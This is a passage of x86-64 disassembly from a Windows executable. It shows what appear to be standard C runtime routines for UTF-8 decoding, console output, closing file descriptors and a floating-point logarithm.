   14000bd6e:	4c 8b fa             	mov    %rdx,%r15
   14000bd71:	4d 0f 45 d9          	cmovne %r9,%r11
   14000bd75:	48 85 d2             	test   %rdx,%rdx
   14000bd78:	41 8d 6a 01          	lea    0x1(%r10),%ebp
   14000bd7c:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000bd80:	44 8b f5             	mov    %ebp,%r14d
   14000bd83:	4d 0f 45 f0          	cmovne %r8,%r14
   14000bd87:	48 f7 d8             	neg    %rax
   14000bd8a:	48 1b f6             	sbb    %rsi,%rsi
   14000bd8d:	48 23 f1             	and    %rcx,%rsi
   14000bd90:	4d 85 f6             	test   %r14,%r14
   14000bd93:	75 0c                	jne    0x14000bda1
   14000bd95:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000bd9c:	e9 4e 01 00 00       	jmp    0x14000beef
   14000bda1:	66 45 39 53 06       	cmp    %r10w,0x6(%r11)
   14000bda6:	75 68                	jne    0x14000be10
   14000bda8:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000bdac:	48 ff c7             	inc    %rdi
   14000bdaf:	45 84 c9             	test   %r9b,%r9b
   14000bdb2:	78 17                	js     0x14000bdcb
   14000bdb4:	48 85 f6             	test   %rsi,%rsi
   14000bdb7:	74 03                	je     0x14000bdbc
   14000bdb9:	44 89 0e             	mov    %r9d,(%rsi)
   14000bdbc:	45 84 c9             	test   %r9b,%r9b
   14000bdbf:	41 0f 95 c2          	setne  %r10b
   14000bdc3:	49 8b c2             	mov    %r10,%rax
   14000bdc6:	e9 24 01 00 00       	jmp    0x14000beef
   14000bdcb:	41 8a c1             	mov    %r9b,%al
   14000bdce:	24 e0                	and    $0xe0,%al
   14000bdd0:	3c c0                	cmp    $0xc0,%al
   14000bdd2:	75 05                	jne    0x14000bdd9
   14000bdd4:	41 b0 02             	mov    $0x2,%r8b
   14000bdd7:	eb 1e                	jmp    0x14000bdf7
   14000bdd9:	41 8a c1             	mov    %r9b,%al
   14000bddc:	24 f0                	and    $0xf0,%al
   14000bdde:	3c e0                	cmp    $0xe0,%al
   14000bde0:	75 05                	jne    0x14000bde7
   14000bde2:	41 b0 03             	mov    $0x3,%r8b
   14000bde5:	eb 10                	jmp    0x14000bdf7
   14000bde7:	41 8a c1             	mov    %r9b,%al
   14000bdea:	24 f8                	and    $0xf8,%al
   14000bdec:	3c f0                	cmp    $0xf0,%al
   14000bdee:	0f 85 e9 00 00 00    	jne    0x14000bedd
   14000bdf4:	41 b0 04             	mov    $0x4,%r8b
   14000bdf7:	41 0f b6 c0          	movzbl %r8b,%eax
   14000bdfb:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000be00:	2b c8                	sub    %eax,%ecx
   14000be02:	8b d5                	mov    %ebp,%edx
   14000be04:	d3 e2                	shl    %cl,%edx
   14000be06:	41 8a d8             	mov    %r8b,%bl
   14000be09:	2b d5                	sub    %ebp,%edx
   14000be0b:	41 23 d1             	and    %r9d,%edx
   14000be0e:	eb 29                	jmp    0x14000be39
   14000be10:	45 8a 43 04          	mov    0x4(%r11),%r8b
   14000be14:	41 8b 13             	mov    (%r11),%edx
   14000be17:	41 8a 5b 06          	mov    0x6(%r11),%bl
   14000be1b:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000be1f:	3c 02                	cmp    $0x2,%al
   14000be21:	0f 87 b6 00 00 00    	ja     0x14000bedd
   14000be27:	40 3a dd             	cmp    %bpl,%bl
   14000be2a:	0f 82 ad 00 00 00    	jb     0x14000bedd
   14000be30:	41 3a d8             	cmp    %r8b,%bl
   14000be33:	0f 83 a4 00 00 00    	jae    0x14000bedd
   14000be39:	0f b6 eb             	movzbl %bl,%ebp
   14000be3c:	49 3b ee             	cmp    %r14,%rbp
   14000be3f:	44 8b cd             	mov    %ebp,%r9d
   14000be42:	4d 0f 43 ce          	cmovae %r14,%r9
   14000be46:	eb 1e                	jmp    0x14000be66
   14000be48:	0f b6 0f             	movzbl (%rdi),%ecx
   14000be4b:	48 ff c7             	inc    %rdi
   14000be4e:	8a c1                	mov    %cl,%al
   14000be50:	24 c0                	and    $0xc0,%al
   14000be52:	3c 80                	cmp    $0x80,%al
   14000be54:	0f 85 83 00 00 00    	jne    0x14000bedd
   14000be5a:	8b c2                	mov    %edx,%eax
   14000be5c:	83 e1 3f             	and    $0x3f,%ecx
   14000be5f:	c1 e0 06             	shl    $0x6,%eax
   14000be62:	8b d1                	mov    %ecx,%edx
   14000be64:	0b d0                	or     %eax,%edx
   14000be66:	48 8b c7             	mov    %rdi,%rax
   14000be69:	49 2b c7             	sub    %r15,%rax
   14000be6c:	49 3b c1             	cmp    %r9,%rax
   14000be6f:	72 d7                	jb     0x14000be48
   14000be71:	4c 3b cd             	cmp    %rbp,%r9
   14000be74:	73 1c                	jae    0x14000be92
   14000be76:	41 0f b6 c0          	movzbl %r8b,%eax
   14000be7a:	41 2a d9             	sub    %r9b,%bl
   14000be7d:	66 41 89 43 04       	mov    %ax,0x4(%r11)
   14000be82:	0f b6 c3             	movzbl %bl,%eax
   14000be85:	66 41 89 43 06       	mov    %ax,0x6(%r11)
   14000be8a:	41 89 13             	mov    %edx,(%r11)
   14000be8d:	e9 03 ff ff ff       	jmp    0x14000bd95
   14000be92:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000be98:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000be9d:	76 3e                	jbe    0x14000bedd
   14000be9f:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000bea5:	73 36                	jae    0x14000bedd
   14000bea7:	41 0f b6 c0          	movzbl %r8b,%eax
   14000beab:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000beb2:	00 
   14000beb3:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000beba:	00 
   14000bebb:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000bec2:	00 
   14000bec3:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000bec7:	72 14                	jb     0x14000bedd
   14000bec9:	48 85 f6             	test   %rsi,%rsi
   14000becc:	74 02                	je     0x14000bed0
   14000bece:	89 16                	mov    %edx,(%rsi)
   14000bed0:	f7 da                	neg    %edx
   14000bed2:	4d 89 13             	mov    %r10,(%r11)
   14000bed5:	48 1b c0             	sbb    %rax,%rax
   14000bed8:	48 23 c5             	and    %rbp,%rax
   14000bedb:	eb 12                	jmp    0x14000beef
   14000bedd:	4d 89 13             	mov    %r10,(%r11)
   14000bee0:	e8 17 a4 ff ff       	call   0x1400062fc
   14000bee5:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000beeb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000beef:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000bef4:	48 33 cc             	xor    %rsp,%rcx
   14000bef7:	e8 24 54 ff ff       	call   0x140001320
   14000befc:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000bf01:	48 83 c4 40          	add    $0x40,%rsp
   14000bf05:	41 5f                	pop    %r15
   14000bf07:	41 5e                	pop    %r14
   14000bf09:	5f                   	pop    %rdi
   14000bf0a:	5e                   	pop    %rsi
   14000bf0b:	5d                   	pop    %rbp
   14000bf0c:	c3                   	ret
   14000bf0d:	cc                   	int3
   14000bf0e:	cc                   	int3
   14000bf0f:	cc                   	int3
   14000bf10:	40 53                	rex push %rbx
   14000bf12:	48 83 ec 40          	sub    $0x40,%rsp
   14000bf16:	48 8b 05 d3 ba 00 00 	mov    0xbad3(%rip),%rax        # 0x1400179f0
   14000bf1d:	33 db                	xor    %ebx,%ebx
   14000bf1f:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000bf23:	75 2e                	jne    0x14000bf53
   14000bf25:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000bf2a:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000bf2e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000bf32:	48 8d 0d e7 91 00 00 	lea    0x91e7(%rip),%rcx        # 0x140015120
   14000bf39:	45 33 c9             	xor    %r9d,%r9d
   14000bf3c:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000bf41:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000bf46:	ff 15 14 98 00 00    	call   *0x9814(%rip)        # 0x140015760
   14000bf4c:	48 89 05 9d ba 00 00 	mov    %rax,0xba9d(%rip)        # 0x1400179f0
   14000bf53:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000bf57:	0f 95 c3             	setne  %bl
   14000bf5a:	8b c3                	mov    %ebx,%eax
   14000bf5c:	48 83 c4 40          	add    $0x40,%rsp
   14000bf60:	5b                   	pop    %rbx
   14000bf61:	c3                   	ret
   14000bf62:	cc                   	int3
   14000bf63:	cc                   	int3
   14000bf64:	48 8b c4             	mov    %rsp,%rax
   14000bf67:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000bf6b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000bf6f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000bf73:	57                   	push   %rdi
   14000bf74:	48 83 ec 40          	sub    $0x40,%rsp
   14000bf78:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000bf7d:	49 8b f8             	mov    %r8,%rdi
   14000bf80:	4d 8b c8             	mov    %r8,%r9
   14000bf83:	8b f2                	mov    %edx,%esi
   14000bf85:	44 8b c2             	mov    %edx,%r8d
   14000bf88:	48 8b e9             	mov    %rcx,%rbp
   14000bf8b:	48 8b d1             	mov    %rcx,%rdx
   14000bf8e:	48 8b 0d 5b ba 00 00 	mov    0xba5b(%rip),%rcx        # 0x1400179f0
   14000bf95:	ff 15 c5 99 00 00    	call   *0x99c5(%rip)        # 0x140015960
   14000bf9b:	8b d8                	mov    %eax,%ebx
   14000bf9d:	85 c0                	test   %eax,%eax
   14000bf9f:	75 6a                	jne    0x14000c00b
   14000bfa1:	ff 15 61 98 00 00    	call   *0x9861(%rip)        # 0x140015808
   14000bfa7:	83 f8 06             	cmp    $0x6,%eax
   14000bfaa:	75 5f                	jne    0x14000c00b
   14000bfac:	48 8b 0d 3d ba 00 00 	mov    0xba3d(%rip),%rcx        # 0x1400179f0
   14000bfb3:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000bfb7:	77 06                	ja     0x14000bfbf
   14000bfb9:	ff 15 91 97 00 00    	call   *0x9791(%rip)        # 0x140015750
   14000bfbf:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bfc5:	48 8d 0d 54 91 00 00 	lea    0x9154(%rip),%rcx        # 0x140015120
   14000bfcc:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000bfd1:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000bfd7:	45 33 c9             	xor    %r9d,%r9d
   14000bfda:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000bfdf:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000bfe4:	ff 15 76 97 00 00    	call   *0x9776(%rip)        # 0x140015760
   14000bfea:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bff0:	4c 8b cf             	mov    %rdi,%r9
   14000bff3:	48 8b c8             	mov    %rax,%rcx
   14000bff6:	48 89 05 f3 b9 00 00 	mov    %rax,0xb9f3(%rip)        # 0x1400179f0
   14000bffd:	44 8b c6             	mov    %esi,%r8d
   14000c000:	48 8b d5             	mov    %rbp,%rdx
   14000c003:	ff 15 57 99 00 00    	call   *0x9957(%rip)        # 0x140015960
   14000c009:	8b d8                	mov    %eax,%ebx
   14000c00b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000c010:	8b c3                	mov    %ebx,%eax
   14000c012:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000c017:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000c01c:	48 83 c4 40          	add    $0x40,%rsp
   14000c020:	5f                   	pop    %rdi
   14000c021:	c3                   	ret
   14000c022:	cc                   	int3
   14000c023:	cc                   	int3
   14000c024:	48 83 ec 28          	sub    $0x28,%rsp
   14000c028:	48 8b 0d c1 b9 00 00 	mov    0xb9c1(%rip),%rcx        # 0x1400179f0
   14000c02f:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000c033:	77 06                	ja     0x14000c03b
   14000c035:	ff 15 15 97 00 00    	call   *0x9715(%rip)        # 0x140015750
   14000c03b:	48 83 c4 28          	add    $0x28,%rsp
   14000c03f:	c3                   	ret
   14000c040:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c044:	48 83 ec 38          	sub    $0x38,%rsp
   14000c048:	48 63 d1             	movslq %ecx,%rdx
   14000c04b:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000c04e:	75 15                	jne    0x14000c065
   14000c050:	e8 c7 a2 ff ff       	call   0x14000631c
   14000c055:	83 20 00             	andl   $0x0,(%rax)
   14000c058:	e8 9f a2 ff ff       	call   0x1400062fc
   14000c05d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c063:	eb 74                	jmp    0x14000c0d9
   14000c065:	85 c9                	test   %ecx,%ecx
   14000c067:	78 58                	js     0x14000c0c1
   14000c069:	3b 15 81 ca 00 00    	cmp    0xca81(%rip),%edx        # 0x140018af0
   14000c06f:	73 50                	jae    0x14000c0c1
   14000c071:	48 8b ca             	mov    %rdx,%rcx
   14000c074:	4c 8d 05 75 c6 00 00 	lea    0xc675(%rip),%r8        # 0x1400186f0
   14000c07b:	83 e1 3f             	and    $0x3f,%ecx
   14000c07e:	48 8b c2             	mov    %rdx,%rax
   14000c081:	48 c1 f8 06          	sar    $0x6,%rax
   14000c085:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000c089:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c08d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000c092:	74 2d                	je     0x14000c0c1
   14000c094:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c099:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000c09d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000c0a1:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000c0a6:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000c0ab:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c0b0:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000c0b5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c0ba:	e8 e5 00 00 00       	call   0x14000c1a4
   14000c0bf:	eb 1b                	jmp    0x14000c0dc
   14000c0c1:	e8 56 a2 ff ff       	call   0x14000631c
   14000c0c6:	83 20 00             	andl   $0x0,(%rax)
   14000c0c9:	e8 2e a2 ff ff       	call   0x1400062fc
   14000c0ce:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c0d4:	e8 f7 97 ff ff       	call   0x1400058d0
   14000c0d9:	83 c8 ff             	or     $0xffffffff,%eax
   14000c0dc:	48 83 c4 38          	add    $0x38,%rsp
   14000c0e0:	c3                   	ret
   14000c0e1:	cc                   	int3
   14000c0e2:	cc                   	int3
   14000c0e3:	cc                   	int3
   14000c0e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c0e9:	57                   	push   %rdi
   14000c0ea:	48 83 ec 20          	sub    $0x20,%rsp
   14000c0ee:	48 63 f9             	movslq %ecx,%rdi
   14000c0f1:	8b cf                	mov    %edi,%ecx
   14000c0f3:	e8 50 c1 ff ff       	call   0x140008248
   14000c0f8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c0fc:	75 04                	jne    0x14000c102
   14000c0fe:	33 db                	xor    %ebx,%ebx
   14000c100:	eb 5a                	jmp    0x14000c15c
   14000c102:	48 8b 05 e7 c5 00 00 	mov    0xc5e7(%rip),%rax        # 0x1400186f0
   14000c109:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000c10e:	83 ff 01             	cmp    $0x1,%edi
   14000c111:	75 09                	jne    0x14000c11c
   14000c113:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000c11a:	75 0d                	jne    0x14000c129
   14000c11c:	3b f9                	cmp    %ecx,%edi
   14000c11e:	75 20                	jne    0x14000c140
   14000c120:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000c127:	74 17                	je     0x14000c140
   14000c129:	e8 1a c1 ff ff       	call   0x140008248
   14000c12e:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c133:	48 8b d8             	mov    %rax,%rbx
   14000c136:	e8 0d c1 ff ff       	call   0x140008248
   14000c13b:	48 3b c3             	cmp    %rbx,%rax
   14000c13e:	74 be                	je     0x14000c0fe
   14000c140:	8b cf                	mov    %edi,%ecx
   14000c142:	e8 01 c1 ff ff       	call   0x140008248
   14000c147:	48 8b c8             	mov    %rax,%rcx
   14000c14a:	ff 15 00 96 00 00    	call   *0x9600(%rip)        # 0x140015750
   14000c150:	85 c0                	test   %eax,%eax
   14000c152:	75 aa                	jne    0x14000c0fe
   14000c154:	ff 15 ae 96 00 00    	call   *0x96ae(%rip)        # 0x140015808
   14000c15a:	8b d8                	mov    %eax,%ebx
   14000c15c:	8b cf                	mov    %edi,%ecx
   14000c15e:	e8 5d c1 ff ff       	call   0x1400082c0
   14000c163:	48 8b d7             	mov    %rdi,%rdx
   14000c166:	4c 8d 05 83 c5 00 00 	lea    0xc583(%rip),%r8        # 0x1400186f0
   14000c16d:	83 e2 3f             	and    $0x3f,%edx
   14000c170:	48 8b cf             	mov    %rdi,%rcx
   14000c173:	48 c1 f9 06          	sar    $0x6,%rcx
   14000c177:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c17b:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000c17f:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000c184:	85 db                	test   %ebx,%ebx
   14000c186:	74 0c                	je     0x14000c194
   14000c188:	8b cb                	mov    %ebx,%ecx
   14000c18a:	e8 ad a1 ff ff       	call   0x14000633c
   14000c18f:	83 c8 ff             	or     $0xffffffff,%eax
   14000c192:	eb 02                	jmp    0x14000c196
   14000c194:	33 c0                	xor    %eax,%eax
   14000c196:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c19b:	48 83 c4 20          	add    $0x20,%rsp
   14000c19f:	5f                   	pop    %rdi
   14000c1a0:	c3                   	ret
   14000c1a1:	cc                   	int3
   14000c1a2:	cc                   	int3
   14000c1a3:	cc                   	int3
   14000c1a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c1a9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000c1ae:	57                   	push   %rdi
   14000c1af:	48 83 ec 20          	sub    $0x20,%rsp
   14000c1b3:	49 8b f9             	mov    %r9,%rdi
   14000c1b6:	49 8b d8             	mov    %r8,%rbx
   14000c1b9:	8b 0a                	mov    (%rdx),%ecx
   14000c1bb:	e8 5c c3 ff ff       	call   0x14000851c
   14000c1c0:	90                   	nop
   14000c1c1:	48 8b 03             	mov    (%rbx),%rax
   14000c1c4:	48 63 08             	movslq (%rax),%rcx
   14000c1c7:	48 8b d1             	mov    %rcx,%rdx
   14000c1ca:	48 8b c1             	mov    %rcx,%rax
   14000c1cd:	48 c1 f8 06          	sar    $0x6,%rax
   14000c1d1:	4c 8d 05 18 c5 00 00 	lea    0xc518(%rip),%r8        # 0x1400186f0
   14000c1d8:	83 e2 3f             	and    $0x3f,%edx
   14000c1db:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c1df:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c1e3:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000c1e8:	74 09                	je     0x14000c1f3
   14000c1ea:	e8 f5 fe ff ff       	call   0x14000c0e4
   14000c1ef:	8b d8                	mov    %eax,%ebx
   14000c1f1:	eb 0e                	jmp    0x14000c201
   14000c1f3:	e8 04 a1 ff ff       	call   0x1400062fc
   14000c1f8:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c1fe:	83 cb ff             	or     $0xffffffff,%ebx
   14000c201:	8b 0f                	mov    (%rdi),%ecx
   14000c203:	e8 3c c3 ff ff       	call   0x140008544
   14000c208:	8b c3                	mov    %ebx,%eax
   14000c20a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c20f:	48 83 c4 20          	add    $0x20,%rsp
   14000c213:	5f                   	pop    %rdi
   14000c214:	c3                   	ret
   14000c215:	cc                   	int3
   14000c216:	cc                   	int3
   14000c217:	cc                   	int3
   14000c218:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000c21c:	33 c0                	xor    %eax,%eax
   14000c21e:	48 89 01             	mov    %rax,(%rcx)
   14000c221:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000c225:	89 41 10             	mov    %eax,0x10(%rcx)
   14000c228:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000c22c:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000c230:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000c233:	c3                   	ret
   14000c234:	cc                   	int3
   14000c235:	cc                   	int3
   14000c236:	cc                   	int3
   14000c237:	cc                   	int3
   14000c238:	cc                   	int3
   14000c239:	cc                   	int3
   14000c23a:	cc                   	int3
   14000c23b:	cc                   	int3
   14000c23c:	cc                   	int3
   14000c23d:	cc                   	int3
   14000c23e:	cc                   	int3
   14000c23f:	cc                   	int3
   14000c240:	48 83 ec 58          	sub    $0x58,%rsp
   14000c244:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000c24a:	83 3d 8b c9 00 00 00 	cmpl   $0x0,0xc98b(%rip)        # 0x140018bdc
   14000c251:	0f 85 e9 02 00 00    	jne    0x14000c540
   14000c257:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000c25b:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000c25f:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000c264:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000c269:	66 0f fb 1d 1f 50 00 	psubq  0x501f(%rip),%xmm3        # 0x140011290
   14000c270:	00 
   14000c271:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000c275:	66 0f 54 2d e3 4f 00 	andpd  0x4fe3(%rip),%xmm5        # 0x140011260
   14000c27c:	00 
   14000c27d:	66 0f 2f 2d db 4f 00 	comisd 0x4fdb(%rip),%xmm5        # 0x140011260
   14000c284:	00 
   14000c285:	0f 84 85 02 00 00    	je     0x14000c510
   14000c28b:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000c28f:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000c293:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000c297:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000c29b:	0f 86 2f 02 00 00    	jbe    0x14000c4d0
   14000c2a1:	66 0f db 15 07 50 00 	pand   0x5007(%rip),%xmm2        # 0x1400112b0
   14000c2a8:	00 
   14000c2a9:	f2 0f 5c 25 8f 50 00 	subsd  0x508f(%rip),%xmm4        # 0x140011340
   14000c2b0:	00 
   14000c2b1:	66 0f 2f 35 17 51 00 	comisd 0x5117(%rip),%xmm6        # 0x1400113d0
   14000c2b8:	00 
   14000c2b9:	0f 84 d8 01 00 00    	je     0x14000c497
   14000c2bf:	66 0f 54 25 69 51 00 	andpd  0x5169(%rip),%xmm4        # 0x140011430
   14000c2c6:	00 
   14000c2c7:	4c 8b c8             	mov    %rax,%r9
   14000c2ca:	48 23 05 ef 4f 00 00 	and    0x4fef(%rip),%rax        # 0x1400112c0
   14000c2d1:	4c 23 0d f8 4f 00 00 	and    0x4ff8(%rip),%r9        # 0x1400112d0
   14000c2d8:	49 d1 e1             	shl    $1,%r9
   14000c2db:	49 03 c1             	add    %r9,%rax
   14000c2de:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000c2e3:	66 0f 2f 25 05 51 00 	comisd 0x5105(%rip),%xmm4        # 0x1400113f0
   14000c2ea:	00 
   14000c2eb:	0f 82 df 00 00 00    	jb     0x14000c3d0
   14000c2f1:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000c2f5:	66 0f eb 15 53 50 00 	por    0x5053(%rip),%xmm2        # 0x140011350
   14000c2fc:	00 
   14000c2fd:	66 0f eb 0d 4b 50 00 	por    0x504b(%rip),%xmm1        # 0x140011350
   14000c304:	00 
   14000c305:	4c 8d 0d b4 61 00 00 	lea    0x61b4(%rip),%r9        # 0x1400124c0
   14000c30c:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000c310:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000c316:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000c31a:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000c31e:	4c 8d 0d 7b 51 00 00 	lea    0x517b(%rip),%r9        # 0x1400114a0
   14000c325:	f2 0f 10 1d 93 50 00 	movsd  0x5093(%rip),%xmm3        # 0x1400113c0
   14000c32c:	00 
   14000c32d:	f2 0f 10 0d 5b 50 00 	movsd  0x505b(%rip),%xmm1        # 0x140011390
   14000c334:	00 
   14000c335:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000c339:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000c33d:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000c341:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000c345:	f2 0f 58 1d 63 50 00 	addsd  0x5063(%rip),%xmm3        # 0x1400113b0
   14000c34c:	00 
   14000c34d:	f2 0f 58 0d 2b 50 00 	addsd  0x502b(%rip),%xmm1        # 0x140011380
   14000c354:	00 
   14000c355:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000c359:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000c35d:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000c361:	f2 0f 58 1d 37 50 00 	addsd  0x5037(%rip),%xmm3        # 0x1400113a0
   14000c368:	00 
   14000c369:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000c36d:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000c371:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000c375:	f2 0f 10 2d a3 4f 00 	movsd  0x4fa3(%rip),%xmm5        # 0x140011320
   14000c37c:	00 
   14000c37d:	f2 0f 59 0d 5b 4f 00 	mulsd  0x4f5b(%rip),%xmm1        # 0x1400112e0
   14000c384:	00 
   14000c385:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000c389:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000c38d:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000c393:	48 8d 15 16 59 00 00 	lea    0x5916(%rip),%rdx        # 0x140011cb0
   14000c39a:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000c39f:	f2 0f 10 25 69 4f 00 	movsd  0x4f69(%rip),%xmm4        # 0x140011310
   14000c3a6:	00 
   14000c3a7:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000c3ab:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000c3af:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000c3b3:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000c3b7:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c3bd:	48 83 c4 58          	add    $0x58,%rsp
   14000c3c1:	c3                   	ret
   14000c3c2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000c3c9:	1f 84 00 00 00 00 00 
   14000c3d0:	f2 0f 10 15 58 4f 00 	movsd  0x4f58(%rip),%xmm2        # 0x140011330
   14000c3d7:	00 
   14000c3d8:	f2 0f 5c 05 60 4f 00 	subsd  0x4f60(%rip),%xmm0        # 0x140011340
   14000c3df:	00 
   14000c3e0:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000c3e4:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000c3e8:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000c3ec:	f2 0f 10 25 5c 50 00 	movsd  0x505c(%rip),%xmm4        # 0x140011450
   14000c3f3:	00 
   14000c3f4:	f2 0f 10 2d 74 50 00 	movsd  0x5074(%rip),%xmm5        # 0x140011470
   14000c3fb:	00 
   14000c3fc:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000c400:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000c404:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000c408:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000c40c:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c410:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c414:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000c418:	f2 0f 58 25 20 50 00 	addsd  0x5020(%rip),%xmm4        # 0x140011440
   14000c41f:	00 
   14000c420:	f2 0f 58 2d 38 50 00 	addsd  0x5038(%rip),%xmm5        # 0x140011460
   14000c427:	00 
   14000c428:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c42c:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
